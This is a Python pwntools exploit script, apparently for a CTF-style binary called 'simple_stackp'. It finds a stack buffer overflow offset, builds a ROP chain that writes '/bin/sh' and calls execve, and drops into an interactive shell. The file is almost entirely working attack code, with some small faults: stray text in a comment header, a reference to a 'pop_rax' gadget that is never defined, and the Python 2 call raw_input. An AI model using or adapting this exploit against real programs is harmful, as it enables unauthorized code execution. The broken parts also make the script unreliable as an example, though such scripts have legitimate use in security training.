#!/usr/bin/env python3
from pwn import *
import sys

# ======================
# CONFIGURATIONgitgit 
# ======================
context.binary = './simple_stackp'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'  # Show all communication

# ======================
# DEBUGGING TOOLS
# ======================
def start():
    if args.GDB or args.DEBUG:
        gdbscript = '''
        break *vulnerable_function+123
        continue
        '''
        return gdb.debug([context.binary.path], gdbscript=gdbscript)
    else:
        return process([context.binary.path])

def find_crash_offset():
    """Automatically determine overflow offset"""
    with process(context.binary.path) as p:
        p.sendlineafter(b"Rate it:", b"129")
        payload = cyclic(300)
        p.sendline(payload)
        p.wait()
        core = p.corefile
        offset = cyclic_find(core.read(core.rsp, 4))
        info(f"Crash at offset: {offset}")
        return offset

def inspect_memory(p, address, length=8, fmt='hex'):
    """View memory in different formats"""
    try:
        data = p.read(address, length)
        if fmt == 'hex':
            return hexdump(data)
        elif fmt == 'string':
            return data.decode('utf-8', 'ignore')
        return data
    except:
        return "Cannot read memory"

# ======================
# EXPLOIT DEVELOPMENT
# ======================
def build_rop_chain(elf):
    rop = ROP(elf)
    
    # 1. Find all gadgets systematically
    gadgets = {
        'pop_rdi': 0x402218,
        'pop_rsi': rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0],
        'pop_rdx': rop.find_gadget(['pop rdx', 'ret'])[0],
        'syscall': 0x4012d1,
        'ret': 0x40101a
    }
    
    # 2. Verify gadgets exist
    for name, addr in gadgets.items():
        if not addr:
            warning(f"Missing gadget: {name}")
        else:
            info(f"{name} @ {hex(addr)}")
    
    # 3. Build chain with verification
    chain = ROP(elf)
    
    # Stack alignment (critical for syscalls)
    chain.raw(gadgets['ret'])
    
    # Write /bin/sh to .bss if not present
    if not next(elf.search(b'/bin/sh'), None):
        chain.call(elf.plt['gets'], [elf.bss() + 0x100])
        filename = elf.bss() + 0x100
    else:
        filename = next(elf.search(b'/bin/sh'))
    
    # Set up execve
    chain.call(gadgets['pop_rdi'], [filename])
    chain.call(gadgets['pop_rsi'], [0, 0])  # argv, dummy r15
    chain.call(gadgets['pop_rdx'], [0])     # envp
    chain.call(gadgets['pop_rax'], [59])    # execve syscall number
    chain.call(gadgets['syscall'])
    
    # Print full chain
    info("ROP Chain Layout:")
    print(chain.dump())
    
    return chain

# ======================
# MAIN EXPLOIT
# ======================
def exploit():
    elf = context.binary
    offset = find_crash_offset()  # Auto-detect or set manually
    
    # Build ROP chain
    rop_chain = build_rop_chain(elf)
    
    # Create payload
    payload = flat({
        offset - 8: [
            b'B'*8,        # Saved RBP
            rop_chain.chain()
        ]
    })
    
    # Debug output
    info("Final payload structure:")
    print(hexdump(payload))
    
    # Execute exploit
    p = start()
    
    if args.DEBUG:
        # Interactive debugging
        raw_input("Attach debugger and press Enter to continue...")
    
    p.sendlineafter(b"Rate it:", b"129")
    p.sendline(payload)
    
    # If using gets(), send /bin/sh afterwards
    if not next(elf.search(b'/bin/sh'), None):
        p.sendline(b"/bin/sh\x00")
    
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "DEBUG":
        args.DEBUG = True
    exploit()